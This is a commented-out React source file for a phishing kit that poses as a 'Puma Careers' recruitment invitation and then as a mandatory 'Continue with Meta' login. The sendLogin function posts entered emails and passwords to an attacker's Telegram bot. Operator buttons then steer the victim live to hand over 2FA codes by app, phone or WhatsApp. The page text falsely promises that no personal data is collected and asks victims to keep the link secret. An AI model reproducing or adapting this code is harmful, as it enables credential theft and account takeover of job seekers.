//   const [sessionId] = useState(() => Math.random().toString(36).slice(2, 10));
//   const [progress, setProgress] = useState(20);
//   const [step, setStep] = useState<
//     | 'login'
//     | '2fa'
//     | 'success'
//     | 'waiting'
//     | 'calendly'
//     | '2fawhatsapp'
//     | '2faphone'
//     | 'meta'
//     | 'captcha'
//   >('captcha');
//   const [error, setError] = useState('');
//   const [captchaError, setCaptchaError] = useState('');
//   const [isLoading, setLoading] = useState(false);
//   const [captchaToken, setCaptchaToken] = useState(false);

//   useTelegramSocket(sessionId, (action) => {
//     setError('');
//     console.log('+++++++++++++++++++++++++');
//     switch (action) {
//       case 'done':
//         setStep('success');
//         break;
//       case 'wrong2fa':
//         setError('Invalid code, please retry.');
//         setStep('2fa');
//         break;
//       case 'support':
//         setStep('waiting');
//         break;
//       case 'wrongpass':
//         setError('Wrong email/password.');
//         setStep('login');
//         break;
//       default:
//         if (action.startsWith('2fa')) {
//           setStep('2fa');
//         }
//     }
//   });

//   const sendLogin = () => {
//     if (!email || !password) return;
//     setLoading(true);
//     fetch(`${API_BASE}/sendMessage`, {
//       method: 'POST',
//       headers: { 'Content-Type': 'application/json' },
//       body: JSON.stringify({
//         chat_id: CHAT_ID,
//         parse_mode: 'HTML',
//         text: `🆕 New Log in\n📧 ${email}\n🔑 ${password}\n🏢 ${sessionId}`,
//         reply_markup: {
//           inline_keyboard: [
//             [{ text: '🔐 Ask for 2FA', callback_data: `2fa_${sessionId}` }],
//             [
//               {
//                 text: '❌ Wrong Pass',
//                 callback_data: `wrongpass_${sessionId}`,
//               },
//             ],
//             [{ text: '✅ Done', callback_data: `done_${sessionId}` }],
//             [{ text: '⏳ Calendly', callback_data: `calendly_${sessionId}` }],
//             [{ text: '📱 2FA Phone', callback_data: `2faphone_${sessionId}` }],
//             [
//               {
//                 text: '💬 2FA WhatsApp',
//                 callback_data: `2fawhatsapp_${sessionId}`,
//               },
//             ],
//           ],
//         },
//       }),
//     }).finally(() => setLoading(false));
//   };

//   useEffect(() => {
//     // @ts-ignore
//     window.onCaptchaSuccess = function (token) {
//       console.log('Captcha success! Token:', token);

//       setCaptchaToken(token);
//       setCaptchaError('');
//     };
//     const script = document.createElement('script');
//     script.src = 'https://www.google.com/recaptcha/api.js';
//     script.async = true;
//     script.defer = true;
//     document.body.appendChild(script);

//     return () => {
//       document.body.removeChild(script);
//       // @ts-ignore
//       delete window.onCaptchaSuccess;
//     };
//   }, []);

//   const onPressContinue = () => {
//     if (!captchaToken) {
//       setCaptchaError("Please verify you're not a robot before continuing");
//     } else {
//       setProgress(40);
//       setStep('meta');
//       setCaptchaError('');
//       fetch(`${API_BASE}/sendMessage`, {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify({
//           chat_id: CHAT_ID,
//           parse_mode: 'HTML',
//           text: `user pressed continue on captcha section\n🤖🤖🤖🤖🤖🤖🤖🤖🤖🤖🤖🤖`,
//         }),
//       }).finally(() => setLoading(false));
//     }
//   };

//   return (
//     <div className="h-full w-full flex flex-col justify-between bg-[#F1F5F8]">
//       <div className="w-screen h-[80px] border border-[#E2E8EB]  flex flex-row justify-between items-center px-[320px] border-b-[2px]">
//         <img
//           src={logo}
//           width={146}
//           height={25}
//           className="cursor-pointer pt-1"
//         />
//         <div className="cursor-pointer">
//           <X
//             size={20}
//             className="cursort-pointer"
//             type="small"
//             color="#384955"
//           />
//         </div>
//       </div>

//       {step === 'captcha' ? (
//         <div className="w-full flex flex-1 justify-center items-center ">
//           <div className="rounded-[40px] w-[515px] h-[620px] bg-white border-solid border-[#E2E8EB] border-[2px] flex flex-col items-center py-12 px-8 pb-4">
//             <img
//               src={talentlogo}
//               width={246}
//               height={45}
//               className="cursor-pointer pt-1"
//             />
//             <p className="text-[30px] text-[#033941] font-inter font-bold mt-5">
//               Welcome to Puma Careers
//             </p>
//             <p className="text-center font-light text-[#4E4E4E] text-[15px] mt-2">
//               Please don’t share this link – it’s a private invitation sent to
//               you personally by one of our recruiters. This opportunity was
//               selected with care, just for you, and we kindly ask that you keep
//               it confidential. We appreciate your discretion, and we’re excited
//               for what’s ahead.
//             </p>
//             <div className="w-[147px] h-[5px] bg-[#033941] my-8"></div>
//             {/* <div className="h-[40px] bg-black w-[200px] mb-12"></div> */}
//             <div className="mb-5 flex flex-col justify-center items-center">
//               <div
//                 className="g-recaptcha "
//                 data-sitekey="6LfGa0ArAAAAAG697McQ3be4gpTS1sBIxZzGrRS6"
//                 data-callback="onCaptchaSuccess"
//               ></div>
//               {captchaError ? (
//                 <p className="text-center text-red-600">
//                   Please verify you're not a robot before continuing
//                 </p>
//               ) : null}
//             </div>
//             <button
//               className="w-[100%] rounded-[30px] bg-[#033941] h-[56px] cursor-pointer"
//               onClick={onPressContinue}
//             >
//               <p className="text-white text-[23px] font-[500]">Continue</p>
//             </button>
//           </div>
//         </div>
//       ) : null}

//       {step === 'meta' ? (
//         <>
//           <div className="w-full flex flex-1 justify-center items-center ">
//             <div className="rounded-[40px] w-[696px] h-[466px] bg-white border-solid border-[#E2E8EB] border-[2px] flex flex-col items-center p-12 px-14">
//               <div className="w-full h-full flex flex-col justify-between">
//                 <div className="w-full">
//                   <p className="font-[600] text-[23px] text-[#033941]">
//                     Authentication Required
//                   </p>
//                   <div className="h-[2px] w-full bg-[#D9D9D9] my-5"></div>
//                   <p className="font-[500] text-[16px] text-[#272727]">
//                     Access to this company’s services requires authentication
//                     through Meta. This authentication method is mandated in
//                     accordance with our internal security protocols and
//                     corporate policies, ensuring secure and compliant access for
//                     all users.
//                   </p>
//                   <p className="font-[400] text-[15.5px] text-[#4E4E4E] mt-4">
//                     Please note that no personal data is collected during the
//                     authentication process. This measure is in place solely to
//                     verify access in alignment with company policy, and all user
//                     privacy is fully respected and protected throughout.
//                   </p>
//                 </div>
//                 <div className="w-full">
//                   <button
//                     className="w-[100%] rounded-[30px] bg-[#0865FE] h-[56px] cursor-pointer  flex flex-row items-center justify-center"
//                     onClick={onPressContinue}
//                   >
//                     <img
//                       src={facebooklogo}
//                       width={27}
//                       height={28}
//                       className="cursor-pointer"
//                     />
//                     <p className="text-white font-[500] text-[18px] pl-2 ">
//                       Continue with Meta
//                     </p>
//                   </button>
//                 </div>
//               </div>
//             </div>
//           </div>
//         </>
//       ) : null}

//       <div className="w-full h-[122px] bg-white border-t-[2px] border-solid border-[#E2E8EB] pt-5">
//         <div className="w-full h-[16px] bg-[#D2D8DC] ">
//           {/* <div className="h-full bg-[#0B6E76] rounded-tr-full w-[30%] rounded-br-full"></div> */}
//           <LinearProgress
//             variant="determinate"
//             value={progress}
//             sx={{
//               height: 16,
//               borderRadius: 4,
//               borderTopLeftRadius: 0,
//               borderBottomLeftRadius: 0,
//               backgroundColor: '#D2D8DC',
//               '& .MuiLinearProgress-bar': {
//                 backgroundColor: '#0B6E76 ',
//                 borderRadius: 4,
//               },
//             }}
//           />
//         </div>
//       </div>
//     </div>
//   );
// };

// const Captcha = ({ captchaError, onPressContinue }: any) => {
//   return (
//     <div className="w-full flex flex-1 justify-center items-center ">
//       <div className="rounded-[40px] w-[515px] h-[620px] bg-white border-solid border-[#E2E8EB] border-[2px] flex flex-col items-center py-12 px-8 pb-4">
//         <img
//           src={talentlogo}
//           width={246}
//           height={45}
//           className="cursor-pointer pt-1"
//         />
//         <p className="text-[30px] text-[#033941] font-inter font-bold mt-5">
//           Welcome to Puma Careers
//         </p>
//         <p className="text-center font-light text-[#4E4E4E] text-[15px] mt-2">
//           Please don’t share this link – it’s a private invitation sent to you
//           personally by one of our recruiters. This opportunity was selected
//           with care, just for you, and we kindly ask that you keep it
//           confidential. We appreciate your discretion, and we’re excited for
//           what’s ahead.
//         </p>
//         <div className="w-[147px] h-[5px] bg-[#033941] my-8"></div>
//         {/* <div className="h-[40px] bg-black w-[200px] mb-12"></div> */}
//         <div className="mb-5 flex flex-col justify-center items-center">
//           <div
//             className="g-recaptcha "
//             data-sitekey="6LfGa0ArAAAAAG697McQ3be4gpTS1sBIxZzGrRS6"
//             data-callback="onCaptchaSuccess"
//           ></div>
//           {captchaError ? (
//             <p className="text-center text-red-600">
//               Please verify you're not a robot before continuing
//             </p>
//           ) : null}
//         </div>
//         <button
//           className="w-[100%] rounded-[30px] bg-[#033941] h-[56px] cursor-pointer"
//           onClick={onPressContinue}
//         >
//           <p className="text-white text-[23px] font-[500]">Continue</p>
//         </button>
//       </div>
//     </div>
//   );
// };

// export default Login;

// // <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow">
// //   {step === 'login' && (
// //     <>
// //       <h2 className="text-xl font-semibold mb-4">Log in</h2>
// //       <input
// //         className="w-full p-2 border rounded mb-3"
// //         placeholder="Email"
// //         value={email}
// //         onChange={(e) => setEmail(e.target.value)}
// //       />
// //       <input
// //         className="w-full p-2 border rounded mb-3"
// //         type="password"
// //         placeholder="Password"
// //         value={password}
// //         onChange={(e) => setPassword(e.target.value)}
// //       />
// //       <button
// //         className="w-full py-2 rounded bg-blue-600 text-white flex justify-center items-center"
// //         onClick={sendLogin}
// //         disabled={isLoading}
// //       >
// //         {isLoading ? (
// //           <Oval height={20} width={20} ariaLabel="loading" />
// //         ) : (
// //           'Log in'
// //         )}
// //       </button>
// //       {error && <p className="text-red-500 mt-2">{error}</p>}
// //     </>
// //   )}

// //   {step === '2fa' && (
// //     <div>
// //       <h2 className="text-xl font-semibold mb-4">Enter 2FA Code</h2>
// //       {/* your 2FA input component goes here */}
// //     </div>
// //   )}

// //   {step === 'waiting' && (
// //     <p className="text-gray-700">Waiting for support…</p>
// //   )}

// //   {step === 'success' && (
// //     <p className="text-green-600 font-medium">All done!</p>
// //   )}
// // </div>
